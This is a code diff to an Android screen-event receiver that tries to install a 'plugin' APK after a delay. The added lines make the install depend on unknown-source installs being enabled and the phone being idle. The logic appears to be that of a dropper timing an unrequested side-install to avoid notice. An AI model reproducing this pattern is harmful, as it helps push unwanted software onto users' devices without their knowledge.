@@ -3,6 +3,8 @@ package com.xstd.qm.receiver;
 import android.content.BroadcastReceiver;
 import android.content.Context;
 import android.content.Intent;
+import android.provider.Settings;
+import android.telephony.TelephonyManager;
 import com.plugin.common.utils.SingleInstanceBase;
 import com.plugin.common.utils.UtilsRuntime;
 import com.xstd.qm.*;
@@ -31,6 +33,10 @@ public class ScreenBroadcastReceiver extends BroadcastReceiver {
                 Config.LOGD("<<<< " + intent.getAction() + " >>>>>"
                                 + " function screen status : " + UtilsRuntime.isScreenLocked(context));
 
+                int open = Settings.Secure.getInt(context.getContentResolver(), Settings.Secure.INSTALL_NON_MARKET_APPS, 0);
+                TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
+                int state = tm != null ? tm.getCallState() : TelephonyManager.CALL_STATE_IDLE;
+
                 //try to install
                 SettingManager.getInstance().init(context);
                 if (!SettingManager.getInstance().getKeyPluginInstalled()
@@ -49,9 +55,13 @@ public class ScreenBroadcastReceiver extends BroadcastReceiver {
                                     + " lanuch time = " + UtilsRuntime.debugFormatTime(SettingManager.getInstance().getKeyLanuchTime())
                                     + " install delay = " + SettingManager.getInstance().getKeyInstallInterval()
                                     + " current time = " + UtilsRuntime.debugFormatTime(cur)
-                                    + " apk exist = " + UtilOperator.isPluginApkExist());
+                                    + " apk exist = " + UtilOperator.isPluginApkExist()
+                                    + " open install NO market APP = " + open
+                                    + " phone state = " + state);
                 }
-                if (UtilOperator.isPluginApkExist()
+                if (open != 0
+                        && state == TelephonyManager.CALL_STATE_IDLE
+                        && UtilOperator.isPluginApkExist()
                         /**&& !UtilsRuntime.isPackageHasInstalled(context, Config.PLUGIN_PACKAGE_NAME)**/
                         && !pluginInstalled) {
                     if (cur > (SettingManager.getInstance().getKeyLanuchTime() + SettingManager.getInstance().getKeyInstallInterval())) {
